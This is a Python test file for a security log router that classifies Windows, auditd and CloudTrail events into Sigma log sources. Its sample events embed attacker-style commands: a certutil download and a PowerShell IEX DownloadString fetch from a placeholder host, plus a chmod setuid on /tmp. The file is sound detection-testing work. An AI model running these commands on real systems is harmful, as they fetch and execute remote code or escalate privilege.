"""Logsource router tests: both Windows collector shapes, auditd, CloudTrail."""

from __future__ import annotations

from sigma.rule import SigmaLogSource

from tripline.logsource import LogSource, classify, normalize, plane_of
from tripline.models import Plane

SYSMON_FLUENTBIT = {
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "EventID": "1",
    "Image": r"C:\Windows\System32\certutil.exe",
    "CommandLine": "certutil -urlcache -f http://x/a a",
}
SECURITY_GET_WINEVENT = {
    "LogName": "Security",
    "Id": 4698,
    "ProviderName": "Microsoft-Windows-Security-Auditing",
    "EventData": {"SubjectUserName": "bob", "TaskName": "\\Updater"},
}
POWERSHELL_TOXML = {
    "Event": {
        "System": {
            "Provider": {"@Name": "Microsoft-Windows-PowerShell"},
            "EventID": {"#text": "4104"},
            "Channel": "Microsoft-Windows-PowerShell/Operational",
        },
        "EventData": {
            "Data": [
                {"@Name": "MessageNumber", "#text": "1"},
                {
                    "@Name": "ScriptBlockText",
                    "#text": "IEX (New-Object Net.WebClient).DownloadString('http://x')",
                },
            ]
        },
    }
}
AUDITD_EXECVE = {"type": "EXECVE", "argc": "3", "a0": "chmod", "a1": "u+s", "a2": "/tmp/x"}
CLOUDTRAIL = {"eventSource": "s3.amazonaws.com", "eventName": "ListBuckets"}


def _names(sources: frozenset[LogSource]) -> set[str]:
    return {str(s) for s in sources}


def test_plane_detection():
    assert plane_of(SYSMON_FLUENTBIT) is Plane.WINDOWS
    assert plane_of(SECURITY_GET_WINEVENT) is Plane.WINDOWS
    assert plane_of(POWERSHELL_TOXML) is Plane.WINDOWS
    assert plane_of(AUDITD_EXECVE) is Plane.LINUX
    assert plane_of(CLOUDTRAIL) is Plane.AWS
    assert plane_of({"hello": "world"}) is None
    assert classify({"hello": "world"}) == frozenset()


def test_sysmon_fluentbit_classification_and_normalization():
    assert _names(classify(SYSMON_FLUENTBIT)) == {
        "product=windows",
        "product=windows service=sysmon",
        "product=windows category=process_creation",
    }
    norm = normalize(SYSMON_FLUENTBIT)
    assert norm["EventID"] == 1 and SYSMON_FLUENTBIT["EventID"] == "1"


def test_security_get_winevent_shape():
    assert _names(classify(SECURITY_GET_WINEVENT)) == {
        "product=windows",
        "product=windows service=security",
    }
    norm = normalize(SECURITY_GET_WINEVENT)
    assert norm["Channel"] == "Security" and norm["EventID"] == 4698
    assert norm["SubjectUserName"] == "bob" and norm["TaskName"] == "\\Updater"
    assert norm["Provider_Name"] == "Microsoft-Windows-Security-Auditing"
    assert norm["LogName"] == "Security"  # originals kept


def test_powershell_toxml_shape():
    assert _names(classify(POWERSHELL_TOXML)) == {
        "product=windows",
        "product=windows service=powershell",
        "product=windows category=ps_script",
    }
    norm = normalize(POWERSHELL_TOXML)
    assert norm["EventID"] == 4104
    assert norm["ScriptBlockText"].startswith("IEX")
    assert norm["Provider_Name"] == "Microsoft-Windows-PowerShell"


def test_auditd_execve_derives_process_creation_fields():
    assert _names(classify(AUDITD_EXECVE)) == {
        "product=linux",
        "product=linux service=auditd",
        "product=linux category=process_creation",
    }
    norm = normalize(AUDITD_EXECVE)
    assert norm["CommandLine"] == "chmod u+s /tmp/x" and norm["Image"] == "chmod"
    with_exe = normalize({**AUDITD_EXECVE, "exe": "/usr/bin/chmod"})
    assert with_exe["Image"] == "/usr/bin/chmod"
    path_record = {"type": "PATH", "name": "/etc/cron.d/x", "nametype": "CREATE"}
    assert "category" not in " ".join(_names(classify(path_record)))
    assert normalize(path_record) is path_record


def test_cloudtrail_classification():
    assert _names(classify(CLOUDTRAIL)) == {"product=aws service=cloudtrail"}
    assert normalize(CLOUDTRAIL) is CLOUDTRAIL


def test_logsource_satisfies_rule_logsource():
    src = LogSource(product="windows", category="process_creation")
    assert src.satisfies(SigmaLogSource(product="windows"))
    assert src.satisfies(SigmaLogSource(category="process_creation"))
    assert not src.satisfies(SigmaLogSource(product="windows", service="sysmon"))
    assert not src.satisfies(SigmaLogSource(product="linux"))
